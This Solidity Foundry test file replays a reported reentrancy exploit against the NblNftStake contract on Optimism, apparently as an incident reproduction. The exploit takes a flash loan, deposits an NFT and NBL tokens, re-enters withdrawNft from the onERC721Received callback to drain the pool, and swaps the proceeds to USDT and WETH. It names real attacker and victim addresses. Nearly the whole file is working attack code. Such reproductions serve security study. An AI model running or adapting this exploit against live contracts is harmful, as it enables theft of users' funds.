// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$180K
// Attacker : https://optimistic.etherscan.io/address/0x1fd0a6a5e232eeba8020a40535ad07013ec4ef12
// Attack Contracts : https://optimistic.etherscan.io/address/0xe4d41bdd6459198b33cc795ff280cee02d91087b
// https://optimistic.etherscan.io/address/0xfc3b08555b1c328ecf8b8a0ccd85679bf59bba4c (selfdestruct)
// Vuln Contract : https://optimistic.etherscan.io/address/0x5499178919c79086fd580d6c5f332a4253244d91
// Attack Tx : https://phalcon.blocksec.com/explorer/tx/optimism/0xf4fc3b638f1a377cf22b729199a9aeb27fc62fe2983a65c4d14b99ee5c5b2328

// @Analysis
// https://twitter.com/SlowMist_Team/status/1750526097106915453
// https://twitter.com/AnciliaInc/status/1750558426382635036

interface INblNftStake {
    function unlockSlot() external;

    function depositNft(uint256 _tokenid, uint256 _index) external;

    function depositNbl(uint256 _index, uint256 _amount) external;

    function withdrawNft(uint256 _index) external;
}

interface IRouterV3 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(
        ExactInputSingleParams memory params
    ) external payable returns (uint256 amountOut);
}

contract ContractTest is Test {
    IERC721 private constant NBF =
        IERC721(0x534e1a8a89548C44BE7abA1c3c27951801940C10);
    IERC20 private constant NBL =
        IERC20(0x4B03afC91295ed778320c2824bAd5eb5A1d852DD);
    IERC20 private constant USDT =
        IERC20(0x94b008aA00579c1307B0EF2c499aD98a8ce58e58);
    IERC20 private constant WETH =
        IERC20(0x4200000000000000000000000000000000000006);
    Uni_Pair_V3 private constant NBL_USDT =
        Uni_Pair_V3(0xfAF037caAfA9620bFAebc04C298Bf4A104963613);
    IRouterV3 private constant Router =
        IRouterV3(0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45);
    INblNftStake private constant NblNftStake =
        INblNftStake(0x5499178919C79086fd580d6c5f332a4253244D91);
    address private constant exploiterEOA =
        0x1FD0a6A5e232EebA8020A40535AD07013Ec4ef12;
    address private constant mainAttackContract =
        0xE4D41BDD6459198B33Cc795ff280cEE02d91087b;
    bool private reenter = true;

    function setUp() public {
        vm.createSelectFork("optimism", 115293068);
        vm.label(address(NBF), "NBF");
        vm.label(address(NBL), "NBL");
        vm.label(address(USDT), "USDT");
        vm.label(address(WETH), "WETH");
        vm.label(address(NBL_USDT), "NBL_USDT");
        vm.label(address(Router), "Router");
        vm.label(address(NblNftStake), "NblNftStake");
        vm.label(exploiterEOA, "exploiterEOA");
        vm.label(mainAttackContract, "mainAttackContract");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "Exploiter USDT balance before attack",
            USDT.balanceOf(address(this)),
            USDT.decimals()
        );

        emit log_named_decimal_uint(
            "Exploiter WETH balance before attack",
            WETH.balanceOf(address(this)),
            WETH.decimals()
        );

        // Transfering NBF NFT token (id = 737) from main attack contract to helper attack contract which will be exploiting reentrancy vulnerability
        vm.prank(mainAttackContract, exploiterEOA);
        NBF.transferFrom(mainAttackContract, address(this), 737);
        assertEq(NBF.ownerOf(737), address(this));

        NBL_USDT.flash(
            address(this),
            NBL.balanceOf(address(NblNftStake)),
            0,
            ""
        );

        NBLToUSDT();
        NBLToWETH();

        emit log_named_decimal_uint(
            "Exploiter USDT balance after attack",
            USDT.balanceOf(address(this)),
            USDT.decimals()
        );

        emit log_named_decimal_uint(
            "Exploiter WETH balance after attack",
            WETH.balanceOf(address(this)),
            WETH.decimals()
        );
    }

    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        USDT.approve(address(Router), type(uint256).max);
        USDT.approve(address(NblNftStake), type(uint256).max);
        NBL.approve(address(Router), type(uint256).max);
        NBL.approve(address(NblNftStake), type(uint256).max);
        uint256 returnAmount = NBL.balanceOf(address(NblNftStake));

        NBF.setApprovalForAll(address(NblNftStake), true);
        NblNftStake.unlockSlot();
        NblNftStake.depositNft(737, 0);
        NblNftStake.depositNbl(0, NBL.balanceOf(address(this)));
        // Flawed function. No reentrancy protection
        NblNftStake.withdrawNft(0);

        // Repaying flashloan
        NBL.transfer(address(NBL_USDT), returnAmount + fee0);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        if (reenter) {
            reenter = false;
            NBF.transferFrom(address(this), address(NblNftStake), 737);
            NblNftStake.withdrawNft(0);
            NblNftStake.depositNft(737, 0);
        }
        return this.onERC721Received.selector;
    }

    function NBLToUSDT() internal {
        IRouterV3.ExactInputSingleParams memory params = IRouterV3
            .ExactInputSingleParams({
                tokenIn: address(NBL),
                tokenOut: address(USDT),
                fee: 3_000,
                recipient: address(this),
                amountIn: (NBL.balanceOf(address(this)) * 9) / 10,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            });

        Router.exactInputSingle(params);
    }

    function NBLToWETH() internal {
        IRouterV3.ExactInputSingleParams memory params = IRouterV3
            .ExactInputSingleParams({
                tokenIn: address(NBL),
                tokenOut: address(WETH),
                fee: 3_000,
                recipient: address(this),
                amountIn: NBL.balanceOf(address(this)),
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            });

        Router.exactInputSingle(params);
    }
}
